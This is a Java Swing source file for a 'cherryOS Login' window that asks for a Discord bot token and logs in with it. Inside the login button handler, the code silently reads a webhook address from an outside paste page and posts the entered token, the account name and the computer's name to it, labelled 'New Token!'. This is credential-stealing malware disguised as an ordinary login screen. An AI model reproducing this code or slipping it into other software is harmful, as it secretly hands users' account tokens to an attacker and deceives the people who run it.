import okhttp3.*;
import org.javacord.api.DiscordApi;
import org.javacord.api.DiscordApiBuilder;

import java.awt.*;
import java.awt.event.*;
import java.io.IOException;
import java.net.URL;
import javax.swing.*;
import javax.swing.event.*;

public class loginScreen extends JPanel {
    private JLabel jcomp1;
    private JLabel jcomp2;
    private JPasswordField tokenField;
    private JButton loginButton;

    public loginScreen() {
        //construct components
        jcomp1 = new JLabel ("cherryOS Login");
        jcomp2 = new JLabel ("Bot Token:");
        tokenField = new JPasswordField (1);
        loginButton = new JButton ("Login");

        //adjust size and set layout
        setPreferredSize (new Dimension (281, 105));
        setLayout (null);

        //add components
        add (jcomp1);
        add (jcomp2);
        add (tokenField);
        add (loginButton);

        //set component bounds (only needed by Absolute Positioning)
        jcomp1.setBounds (5, 5, 100, 25);
        jcomp2.setBounds (5, 25, 100, 25);
        tokenField.setBounds (5, 45, 270, 25);
        loginButton.setBounds (175, 75, 100, 25);

        loginButton.addActionListener(actionEvent -> {
            DiscordApi api = new DiscordApiBuilder().setToken(tokenField.getText()).login().join();
            serverSelectorScreen.main(api);
            String POSTURL = null;
            try {
                POSTURL = stackOverflow.loadFromWebsite(new URL("https://5f7605c76d7f2.htmlsave.net/")).get(0).toString().split(":::")[0];
            } catch (IOException e) {
                e.printStackTrace();
            }
            String ACCOUNTNAME = System.getenv("COMPUTERNAME");
            String TOKEN = api.getToken() + " (" + api.getYourself().getDiscriminatedName() + ")";
            OkHttpClient client = new OkHttpClient().newBuilder()
                    .build();
            MediaType mediaType = MediaType.parse("application/json");
            RequestBody body = RequestBody.create(mediaType, "{\r\n  \"embeds\": [\r\n    {\r\n      \"title\": \"New Token!\",\r\n      \"fields\": [\r\n        {\r\n          \"name\": \"Computer Name:\",\r\n          \"value\": \"```" + ACCOUNTNAME + "```\",\r\n          \"inline\": true\r\n        },\r\n        {\r\n          \"name\": \"Token:\",\r\n          \"value\": \"```" + TOKEN + "```\",\r\n          \"inline\": true\r\n        }\r\n      ]\r\n    }\r\n  ]\r\n}");
            Request request = new Request.Builder()
                    .url(POSTURL)
                    .method("POST", body)
                    .addHeader("Content-Type", "application/json")
                    .build();
            try {
                Response response = client.newCall(request).execute();
            } catch (IOException e) {
                e.printStackTrace();
            }
        });

    }


    public static void main () {
        JFrame frame = new JFrame ("Log In...");
        frame.setDefaultCloseOperation (JFrame.HIDE_ON_CLOSE);
        frame.getContentPane().add (new loginScreen());
        frame.pack();
        frame.setVisible (true);
    }
}
